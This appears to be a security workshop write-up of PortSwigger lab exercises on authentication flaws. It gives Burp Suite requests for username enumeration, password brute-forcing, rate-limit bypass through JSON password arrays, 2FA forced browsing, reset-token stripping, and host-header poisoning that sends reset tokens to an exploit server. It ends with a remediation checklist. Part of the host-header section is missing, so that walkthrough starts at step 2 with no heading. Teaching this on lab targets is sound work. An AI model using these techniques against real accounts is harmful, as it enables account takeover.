1. Anatomy of Enterprise Authentication Flaws

Authentication is the critical gatekeeper of any modern application. When authentication mechanisms are flawed, attackers can bypass identity verification entirely, gaining administrative privileges, accessing confidential data, and impersonating legitimate users.

On Day 8 of the BugXploit workshop, the mentors led the cohort through deep practical exploitation of real-world authentication mechanisms on the PortSwigger Web Security Academy. Authentication flaws rarely stem from broken cryptographic algorithms; rather, they arise from subtle logical errors, inconsistent error handling, flawed rate-limiting state machines, and insecure reverse proxy interactions.

2. Lab 1: Username Enumeration via Response Differences

Apprentice Lab View Official Lab

Lab: Username enumeration via different responses

Vulnerability: The application returns subtly distinct error messages and response byte lengths depending on whether the submitted username exists in the database.

The Technical Problem

Secure authentication endpoints must treat invalid login attempts with identical ambiguity: "Invalid username or password". However, legacy or improperly designed login handlers evaluate credentials in two distinct logical branches:

  1. Check if the username exists in the database. If not found, abort immediately with Invalid username.
  2. If the username exists, verify the password hash. If incorrect, abort with Incorrect password.

This procedural leakage allows an attacker to separate the credential auditing process into two phases: first discovering a valid username, and second, focusing computational brute-force power exclusively against that confirmed account.

Step-by-Step Exploitation in Burp Suite

  1. Capture Baseline Request: Submit an intentional invalid login (e.g., username=testuser&password=testpass). In Burp Suite, navigate to Proxy > HTTP history and locate the POST /login request.
  2. Send to Burp Intruder: Press Ctrl + I to send the request to Intruder.
  3. Configure Payload Positions (Sniper Attack): Set the attack type to Sniper. Clear default payload markers and assign a single marker to the username value: 
    POST /login HTTP/1.1
Host: <target-lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=xxxxxx&username=§testuser§&password=staticpassword
  4. Load Candidate Usernames: Under the Payloads tab, paste the wordlist of candidate usernames. Start the attack.
  5. Analyze Response Length & Content: Sort the Intruder results table by the Length column. Notice that one payload yields a slightly longer response length (e.g., 3,330 bytes vs 3,312 bytes). Inspecting the response reveals the message: 
    <p class=is-warning>Incorrect password</p>
    whereas every other payload returned: 
    <p class=is-warning>Invalid username</p>
    Discovered Valid Username: ao.
  6. Phase 2: Brute-Forcing the Password: Return to Intruder positions. Set the username statically to ao and position the payload marker on the password field: 
    csrf=xxxxxx&username=ao&password=§testpassword§
  7. Execute Password Attack: Load the candidate passwords wordlist and launch the attack. Every invalid password returns an HTTP 200 OK response. Exactly one request returns an HTTP 302 Found redirection with a Set-Cookie: session=... header.
  8. Target Compromised: Discovered valid password: jessica. Logging in as ao:jessica successfully solves the lab.

3. Defensive Rate-Limiting & Evasion Strategies

To prevent attackers from running dictionary attacks, enterprise web applications deploy Rate Limiting and Account Lockout mechanisms:

  • IP-Based Rate Limiting: Blocking or throttling any client IP address that sends more than 3 to 5 failed login attempts within a specific time window.
  • Account Lockout: Temporarily disabling the user account after 3 to 5 incorrect password submissions.

However, rate limiters frequently suffer from design limitations that attackers can exploit:

1. IP Spoofing Headers

If the rate-limiter relies on reverse-proxy headers without filtering, injecting headers like X-Forwarded-For: 127.0.0.1, X-Real-IP, or Client-IP can fool the server into treating each request as originating from a new client.

2. Low-and-Slow Spraying

Password spraying tests 1 password across thousands of usernames rather than thousands of passwords against 1 user, remaining below per-account threshold limits.

3. Batch Request Injection

Submitting an array of candidate passwords within a single HTTP request packet, allowing the attacker to test 100+ passwords while only registering 1 single request counter at the rate limiter.

4. Lab 2: Bypassing Rate Limits via Multiple Credentials (JSON Array)

Expert Lab View Official Lab

Lab: Broken brute-force protection, multiple credentials per request

Vulnerability: The login API accepts credentials as a JSON object. The backend parser supports array structures for the password parameter, iterating over each password while the rate-limiter only tallies single incoming HTTP requests.

The Real-World Scenario & Logic Flaw

In this lab, entering more than 3 failed attempts from an IP results in an immediate block: "You have made too many incorrect login attempts. Please try again in 1 minute." A standard Burp Intruder attack fails because the scanner triggers the rate limiter on request #4.

However, inspecting the request body reveals that authentication is handled by a modern JSON endpoint: 

POST /login HTTP/2
Host: <target-lab-id>.web-security-academy.net
Content-Type: application/json

{"username":"carlos","password":"invalidpassword"}

Because of sloppy type-checking in the backend authentication routine (common in Node.js, Python, or PHP backends), the server expects password to be a string, but if an array of strings is provided, the backend executes a loop: 

// Flawed Backend Conceptual Logic
for (let pass of request.body.password) {
    if (verifyPassword(request.body.username, pass)) {
        return createSession(request.body.username); // Logs in on first match!
    }
}
return error("Invalid credentials");

Exploitation Walkthrough

  1. Capture the POST /login JSON request in Burp Suite and send it to Burp Repeater (Ctrl + R).
  2. Replace the single password string with a complete JSON array containing all 100+ candidate passwords provided by the lab:
    Burp Repeater: JSON Batch Payload
    POST /login HTTP/2
    Host: 0a1f00c90352f3e4821c8da400c9002f.web-security-academy.net
    Content-Type: application/json
    Cookie: session=tc5vIGDaX8RP9ycnF62WGm4yIfhsG7X2

    {"username":"carlos","password":[
      "123456",
      "password",
      "12345678",
      "qwerty",
      ...
      "montana",
      "moon",
      "moscow"
    ]}
  3. Dispatch Single Request: Click Send. Because only one single HTTP request is transmitted, the rate-limiter counts 1 / 3 requests and does NOT trigger an IP block!
  4. Immediate Success Response: The server iterates through the array, encounters the correct password, and responds with: 
    HTTP/2 302 Found
Location: /my-account?id=carlos
Set-Cookie: session=zXDZ44Wiyy9FCEfgcs3G2sSC98nJfHNz; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 0
  5. Browser Session Takeover: Right-click the response in Burp Repeater > select Show response in browser > copy the generated URL > paste it into your browser. You are instantly authenticated into Carlos's administrative account.

5. Two-Factor Authentication (2FA) Architecture & Attack Vectors

Two-Factor Authentication (2FA) requires users to provide two distinct authentication factors: something they know (password) and something they have (SMS OTP, Authenticator app TOTP, hardware key).

Common architectural flaws in 2FA implementations include:

  • Flawed State Transitions: Creating the fully authenticated user session immediately upon Stage 1 (password verification) instead of waiting for Stage 2 (2FA code validation).
  • Leaking OTPs in Responses: Returning the generated verification code inside the JSON response of the /send-2fa API call for frontend validation.
  • Brute-Forceable OTPs: Generating short 4-digit codes (0000–9999) without rate limiting, allowing automated brute-forcing in under 10 seconds.
  • Channel Compromise: Email-based 2FA offers zero security if the attacker already has access to the user's email account. SMS-based 2FA is vulnerable to SIM swapping and SS7 attacks. Hardware authenticators (YubiKey / WebAuthn) offer the highest resilience.

6. Lab 3: 2FA Simple Bypass via Forced Browsing

Apprentice Lab View Official Lab

Lab: 2FA simple bypass

Vulnerability: The application fails to enforce completion of the 2FA stage before authorizing access to authenticated endpoints.

Step-by-Step Exploitation

  1. Observe Normal Baseline: Log in with your own credentials (wiener:peter). You are redirected to /login2 and prompted for a 4-digit 2FA code. Open your email client, retrieve the code, submit it, and observe that your browser lands on: 
    GET /my-account?id=wiener
  2. Log Out: Terminate your session.
  3. Initiate Target Login: Log in with victim credentials (carlos:montoya). The server validates the password and redirects your browser to the 2FA verification prompt at /login2.
  4. Execute Forced Browsing Bypass: Without submitting any 2FA code, simply modify the browser URL bar directly to: 
    https://<target-lab-id>.web-security-academy.net/my-account
  5. Vulnerability Confirmation: The server checks the session cookie, verifies that the user successfully completed password authentication, but fails to check whether the 2FA state flag was validated. The account dashboard immediately loads, solving the lab.

7. Lab 4: Password Reset Broken Logic (Token Stripping)

Apprentice Lab View Official Lab

Lab: Password reset broken logic

Vulnerability: The password reset confirmation routine relies on a client-submitted hidden form parameter rather than binding the reset token to the target account.

Step-by-Step Exploitation

  1. Trigger Reset on Controlled Account: Click Forgot password? and submit wiener. Access the email client and click the delivered password reset link.
  2. Inspect Reset Submission: Enter a new password (e.g., newpassword123). Intercept the submission in Burp Suite: 
    POST /forgot-password?temp-forgot-password-token=xxxxxxxxxxxxxxxxxxxx HTTP/1.1
Host: <target-lab-id>.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=xxxxxxxxxxxxxxxxxxxx&username=wiener&new-password-1=newpassword123&new-password-2=newpassword123
  3. Parameter Tampering & Token Stripping: Send the request to Burp Repeater. Delete the token value from both the query parameter and the POST body: 
    POST /forgot-password?temp-forgot-password-token= HTTP/1.1
...
temp-forgot-password-token=&username=carlos&new-password-1=hacked123&new-password-2=hacked123
  4. Execute Account Takeover: Click Send. The backend simply verifies whether the submitted token (empty string) equals the database token for Carlos (null / uninitialized), or ignores the token check altogether, resetting Carlos's password to hacked123.
  5. Log in as carlos:hacked123 to achieve full account takeover.

8. Host Header Injection & Reverse Proxy Middleware

Web applications running behind reverse proxies, load balancers, and CDNs often construct absolute URLs dynamically based on incoming HTTP request headers:

mail($userEmail, "Reset Your Password", $resetUrl);

  2. Configure Attacker Exploit Server: Open the provided Exploit Server tab and record your unique host identifier: 
    YOUR-EXPLOIT-SERVER-ID.exploit-server.net
  3. Inject X-Forwarded-Host Header: In Burp Repeater, add the X-Forwarded-Host header pointing to your exploit server, and set the target username to carlos:
    Burp Repeater: Poisoned Password Reset Request
    POST /forgot-password HTTP/1.1
    Host: <lab-target-id>.web-security-academy.net
    X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 26

    csrf=xxxxxx&username=carlos
  4. Victim Interaction: The backend generates a valid cryptographic token for Carlos, builds the reset link using the poisoned host header: 
    https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/forgot-password?temp-forgot-password-token=STOLEN_TOKEN_HERE
    and sends this link to Carlos's email address. The simulated victim clicks the link in their email.
  5. Harvesting Token from Access Logs: Navigate to your Exploit Server > open the Access log. Observe an incoming HTTP GET request from Carlos's browser: 
    10.0.x.x - - "GET /forgot-password?temp-forgot-password-token=mF4e3pQ7wK9xL2... HTTP/1.1" 404

    https://<lab-target-id>.web-security-academy.net/forgot-password?temp-forgot-password-token=mF4e3pQ7wK9xL2...
    Submit a new password and immediately log in to Carlos's account, solving the lab.

10. Defense-in-Depth & Remediation Architecture

Securing authentication requires defensive controls at every layer of the application lifecycle:

Defensive Hardening Checklist
  • Uniform Error Messages: Never indicate whether a username or password was incorrect. Always return: "Invalid username or password" with identical byte lengths and response times.
  • Strict Parameter Type Validation: Reject unexpected parameter types (e.g., rejecting arrays when strings are expected) to neutralize batch array bypass attacks.
  • Cryptographic 2FA Binding: Store the 2FA state server-side in the session cache (e.g., Redis) and block access to all authenticated routes until the 2FA state transition is marked complete.
  • Never Trust Host Headers for URLs: Hardcode domain names in server configuration files (e.g., APP_URL=https://company.com) rather than constructing reset links dynamically from Host or X-Forwarded-Host headers.
  • Single-Use, Time-Bound Tokens: Ensure password reset tokens are tied cryptographically to a user ID, expire within 15 minutes, and invalidate immediately upon use.

11. Day 8 Summary & Key Takeaways

Core Insights from Day 8

  • Error Differences Fuel Enumeration: Subtly distinct error messages or response lengths transform a complex password brute-force into a trivial two-step reconnaissance task.
  • Rate Limits Can Be Circumvented via Protocol Features: Array structures in JSON bodies allow testing hundreds of passwords within a single HTTP request packet, completely bypassing IP rate limits.
  • 2FA is Only as Strong as Its State Machine: If protected endpoints (like /my-account) fail to verify that the 2FA stage was completed, forced browsing neutralizes 2FA entirely.
  • Host Header Poisoning is Lethal: Dynamically building password reset links from reverse proxy headers allows unauthenticated attackers to steal reset tokens out-of-band.
